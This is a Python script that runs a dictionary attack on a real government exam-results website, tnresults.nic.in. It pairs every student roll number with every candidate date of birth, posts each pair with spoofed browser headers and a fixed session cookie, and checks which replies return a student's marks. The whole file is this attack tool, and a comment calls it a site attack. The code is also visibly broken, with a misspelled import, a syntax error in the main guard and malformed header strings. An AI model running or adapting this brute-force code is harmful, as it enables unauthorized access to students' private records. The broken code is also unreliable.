from requests import post 
from bs4 import BeautifulSoup 
from datetime import datatime,timedelta

def process_package(package):
    size = str(len(package.content)/1008)[0:4]
    status = package.status_code
    content = BeautifulSoup(package.text, 'html.parser').find('div',{'data-role' : 'content'}).text
    name = str( ' ' + content.splitlines()[6] +') ')
    
    if 50>= len(content):
        return { 'valid': False, 'content': content, 'size': size, 'status': status, 'name': name}
    else:
        return { 'valid': True, 'content': content, 'size': size, 'status': status, 'name': name}

def result_screen(Details : dict):
    pass

def connection_send_package(roll_no, date_of_brith):
    url = 'https://tnresults.nic.in/wrfexrcd.asp' # CHECK URLPATH TO CORRECT SITE AATTACK
    header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.7' ,
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-IN, en-GB;q=0.9,en-US;q=0.8,en;q=0.7' ,
    'Cache-Control': 'max-age=0' ,
    'Connection': 'keep-alive',
    'Content-Length': '45',
    'Content-Type':'application/x-www-form-urlencoded',
    'Cookie': 'ASPSESSIONIDCQABDARQ-GAAMKBBBEHJNBIKLKOCKENHL' ,
    'Host': 'tnresults.nic.in',
    'Origin': 'https://tnresults.nic.in',
    'Referer': 'https://tnresults.nic.in/wpcsxtd.htm',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36sec-ch-ua: "Not-A. Brand";v="99", "Chromium"; v="124" ' ,
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Android" '}
    
    payload = {'regno':roll_no, 'dob': date_of_brith, 'B1':'Get Marks'}
    responce = post(url, headers=header, data=payload)
    return responce

def students_dictionary_attack( collaction_of_roll_no, collaction_of_date_of_brith):
    
    total_number_of_Id = 0
    total_count_of_squence_over_student  = 0 
    number_of_dates = 0
    
    for studentID in collaction_of_roll_no:
        total_number_of_Id += 1
        number_of_dates = len( collaction_of_date_of_brith)
        
        for date_of_brith in collaction_of_date_of_brith:
            number_of_dates -= 1
            total_count_of_squence_over_student += 1
            
            package = connection_send_package( studentID, date_of_brith)
            result = process_package(package)
            
            result_screen( (total_number_of_Id) )
            

if __name__ = '__main__':
    pass
